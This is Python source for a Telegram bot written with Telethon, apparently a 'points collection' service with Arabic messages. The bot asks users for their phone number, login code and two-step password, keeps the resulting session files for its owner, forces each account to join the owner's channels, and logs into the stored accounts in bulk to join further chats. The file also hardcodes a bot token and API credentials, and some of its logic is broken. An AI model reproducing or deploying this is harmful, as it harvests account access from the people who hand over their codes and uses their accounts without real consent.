from telethon import TelegramClient, events, Button, errors
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.auth import SendCodeRequest
from telethon.sessions import StringSession
import asyncio, json, os, re

# bot session
token = "6109895485:AAE43imQ2y0W_yDx5B_Fsdod_SWt7MyrKQg"
api_id_bot = 25230422
api_hash_bot = "ade18a444a3ca95930a9e5a6a6d8ecb5"
bot = TelegramClient("Bot", api_id_bot, api_hash_bot).start(bot_token=token)

# needs
owner_id = [6699312679]
collect, bots_to_collect, start_earn = True, [], False

# LOAD SESSION
sessions = json.load(open("sessions/sessions.json"))

# NEW USERS TO JSON
async def ToJson(user, path):
    with open(path, 'w') as file:
        json.dump(user, file)

# points
points = 1000

# user info
api_id = 25230422
api_hash = "ade18a444a3ca95930a9e5a6a6d8ecb5"

# ADD NEW NUMBER
async def Add_NUMBER(event, api_id, api_hash, phone_number):
    try:
        phone_number = phone_number.replace('+', '').replace(' ', '')
        iqthon = TelegramClient("sessions/"+phone_number+".session", api_id, api_hash)
        await iqthon.connect()

        if not await iqthon.is_user_authorized():
            request = await iqthon.send_code_request(phone_number)

            async with bot.conversation(event.chat_id, timeout=300) as conv:
                verification_code_msg = await conv.send_message("**- تم إرسال كود التحقق الى الحساب من فضلك قم بارساله الآن انا بالانتظار:**")
                response_verification_code = await conv.get_response()
                verification_code = str(response_verification_code.message).replace('-', '')

                try:
                    login = await iqthon.sign_in(phone_number, code=int(verification_code))
                except errors.SessionPasswordNeededError:
                    password_msg = await conv.send_message("**- الحساب محمي بكلمة مرور (التحقق بخطوتين) من فضلك قم بارسال كلمة المرور انا بالانتظار:**")
                    password = await conv.get_response()

                    login = await iqthon.sign_in(phone_number, password=password.text)

            # انضمام إلى القنوات (إذا كان ذلك مطلوبًا)
            try:
                await iqthon(JoinChannelRequest('ALRAGI1'))
                await iqthon(JoinChannelRequest('YY2PP'))
                await iqthon(JoinChannelRequest('YB_13'))
                await iqthon(JoinChannelRequest('YYNXX7'))
            except:
                pass

            # إضافة المعلومات إلى ملف JSON
            count = f"session_{phone_number}"
            New_item = {count: {"phone": phone_number, "api_id": api_id, "api_hash": api_hash}}
            sessions.update(New_item)

            await ToJson(sessions, "sessions/sessions.json")

            return "تم اضافة الرقم بنجاح"
    except Exception as error:
        return str(error)

# KEYBOARD
async def StartButtons(event, role):
    buttons = []

    if role == 2:
        buttons.append([Button.inline("اضف رقم", "add_number")])
        buttons.append([Button.inline("تعيين النقاط", "set_points")])
    elif role == 1:
        buttons.append([Button.inline("اضف رقم", "add_number")])
        buttons.append([Button.inline("حذف رقم", "remove_number")])
        buttons.append([Button.inline("تعيين النقاط", "set_points")])

    await event.reply("**لاضافة حساب اضغط على الزر بالأسفل لبدأ عملية اضافة الارقام.\n [مطور البوت](https://t.me/yynxx)** ", buttons=buttons)

#...

@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

# DELETE NUMBER TELEGRAM BOT 
@bot.on(events.CallbackQuery(data="remove_number"))
async def Callbacks_(event):
    global sessions

    delete, sessions, in_session = await event.delete(), json.load(open("sessions/sessions.json")), False
    try:
        async with bot.conversation(event.chat_id, timeout=200) as conv:
            # verification code
            get_number= await conv.send_message("**ارسل الرقم  الذي تريد حذفه ❓. **")
            remove_number = await conv.get_response()
            remove_number = (remove_number.text).replace('+', '').replace(' ', '')
            for session in sessions:
                session_number = sessions.get(session).get("phone")
                if remove_number == session_number:
                    del sessions[session]
                    await ToJson(sessions, "sessions/sessions.json")
                    in_session = True
                    break

    except Exception as error:
        print (error)

    if in_session == True:
        await event.reply("**- تم حذف الرقم بنجاح ✅. **")
        sessions = json.load(open("sessions/sessions.json"))
    else:
        await event.reply("**- هذا الرقم غير موجود ⛔. **")

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

# تعريف متغير لعدد الجلسات
session_count = len(sessions)  # حيث أن sessions هو قائمة تحتوي على الجلسات الحالية

@bot.on(events.NewMessage)
async def handle_message(event):
    if event.chat_id in owner_id:
        if ".عدد الحسابات" in event.text:
            await event.reply(f"عدد الحسابات الحالية هو: {session_count}")

# ADD NUMBER TELEGRAM BOT INFORMATION
@bot.on(events.CallbackQuery(data="add_number"))
async def Callbacks(event):

    await event.delete()    
    try:
        # get information from user
        async with bot.conversation(event.chat_id, timeout=300) as conv:

            await conv.send_message('**- ارسل رقم الهاتف مع رمز الدولة📳. \n- كمثال 👈🏼:  +3584573989131**')
            phone_number_msg = await conv.get_response()
            phone_number_msg = phone_number_msg.text

            await conv.send_message(f'''
**Api id :** `{api_id}`
**Api hash :** `{api_hash}`
**Phone number :** `{phone_number_msg}`

**جاري تسجيل الدخول 👨🏽‍💻🔄**
''')

        result = await Add_NUMBER(event, int(api_id), api_hash, phone_number_msg)
        await event.reply(result)
    except Exception as error:
        pass

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)


@bot.on(events.CallbackQuery(data="set_points"))
async def set_points_callback(event):
    global sessions

    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message("**- الرجاء إدخال عدد النقاط المطلوبة (بين 1000 و 5000 نقطة):**")
        point_msg = await conv.get_response()
        point = point_msg.text.strip()

        try:
            points = int(point)
            if 1000 <= points <= 5000:
                # هنا يمكنك إجراء إجراءات إضافية على أساس النقاط المعينة
                await conv.send_message(f"**- تم تثبيت تجميع النقاط على العدد {points} بنجاح ✅.**")
            else:
                await conv.send_message("**- لقد فشلت عملية تعيين النقاط ❓\n الرجاء التأكد من أن الرقم المدخل عدد صحيح وواقع بين الرقم 1000 والرقم 5000 ثم حاول مرة أخرى.**")
        except ValueError:
            await conv.send_message("**- فشل في تعيين النقاط. الرجاء إدخال عدد صحيح فقط❌.**")

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

#...

# تشغيل العميل

#####################################################################################
# STOP COLLECT POINTS
@bot.on(events.NewMessage(pattern=r'.ايقاف الجمع'))
async def StopCollectPoints(event):
    global collect
    if event.chat_id in owner_id:
        collect = False
        stop_collect = await event.reply('**تم ايقاف الجمع**')

# START COLLECT POINTS
@bot.on(events.NewMessage(pattern=r'.بدء الجمع ?(.*)'))
async def StartCollectPoints(event):
    global start_earn

    if event.chat_id in owner_id:
        bot_username = (event.message.message).replace('.بدء الجمع', '').strip()
        start_collect, collect = await event.reply('**تم بدأ الجمع**'), True

        # collect
        if start_earn == False:
            start_earn = True
            task = asyncio.create_task(StartCollect(event, bot_username))
            await task

        order = await event.reply('**- تم الجمع من جميع الحسابات ✅. \n- وتمت عملية إيقاف الجمع بنجاح ✅. **')


# JOIN PUBLIC
async def JoinChannel(client, username):
    try:
        Join = await client(JoinChannelRequest(channel=username))
        return [True, '']
    except errors.FloodWaitError as error:
        return [False, f'تم حظر هذا الحساب من الانضمام للقنوات لمدة : {error.seconds} ثانية']
    except errors.ChannelsTooMuchError:
        return [False, '**- هذا الحساب وصل للحد الاقصى من القنوات التي يستطيع الانضمام لها⛔.**']
    except errors.ChannelInvalidError:
        return [False, False]
    except errors.ChannelPrivateError:
        return [False, False]
    except errors.InviteRequestSentError:
        return [False, False]
    except Exception as error:
        return [False, f'{error}']

# JOIN PRIVATE
async def JoinChannelPrivate(client, username):
    try:
        Join = await client(ImportChatInviteRequest(hash=username))
        return [True, '']
    except errors.UserAlreadyParticipantError:
        return [True, '']
    except errors.UsersTooMuchError:
        return [False, False]
    except errors.ChannelsTooMuchError:
        return [False, '**- هذا الحساب وصل للحد الاقصى من القنوات التي يستطيع الانضمام لها🚫.**']
    except errors.InviteHashEmptyError:
        return [False, False]
    except errors.InviteHashExpiredError:
        return [False, False]
    except errors.InviteHashInvalidError:
        return [False, False]
    except errors.InviteRequestSentError:
        return [False, False]
    except Exception as error:
        return [False, f'{error}']

# COLLECT NOW
async def StartCollect(event, bot_username):
    # load sessions
    sessions = json.load(open("sessions/sessions.json"))
    while collect != False:
        for session in sessions:
            try:
                if collect == False:
                    # disconnect
                    try:
                        await client.disconnect()
                    except Exception as error:
                        pass
                    break

                api_id = int(sessions[session]["api_id"])
                api_hash = str(sessions[session]["api_hash"])
                phone = str(sessions[session]["phone"])

                client = TelegramClient("sessions/"+(phone), api_id, api_hash)
                await client.connect()

                if not await client.is_user_authorized():
                    try:
                        await client.send_code_request(phone)
                    except:
                        pass

                # Set the callback function for handling new messages
                @client.on(events.NewMessage(incoming=True))
                async def handle_new_message(event):

                    if collect != True:
                        return False

                    try:
                        if hasattr(event.message, 'text'):
                            text = event.message.text

                            if text != None:
                                if client.is_connected():
                                    if (event.message.is_private == False):
                                        username = await client.get_entity(event.input_chat)
                                        if "t.me/" in bot_username:
                                            bot_username = bot_username.split("t.me/")[1]
                                        if bot_username == username.username:
                                            if event.chat_id == event.from_id:
                                                await event.reply("**- لقد تم الجمع بنجاح 🔄.\n- جاري ايقاف الجمع وتسجيله في اللوج\n- انتظر لنهاية العملية ولا تضغط على اي زر ف الوقت الحالي⏳. **")
                                                StopCollectPoints(event)
                                        else:
                                            return [False, False]
                                    else:
                                        return [False, False]
                                else:
                                    return [False, False]
                            else:
                                return [False, False]
                        else:
                            return [False, False]
                    except Exception as e:
                        return [False, False]

                await JoinChannel(client, "YB_13")
                await JoinChannel(client, "ALRAGI1")
                await JoinChannel(client, "YYNXX7")

                for chat in event.chats:
                    try:
                        await JoinChannelPrivate(client, chat.username)
                    except:
                        pass

                await client.disconnect()

            except Exception as error:
                if collect != False:
                    pass
                else:
                    break


bot.start()
bot.run_until_disconnected()
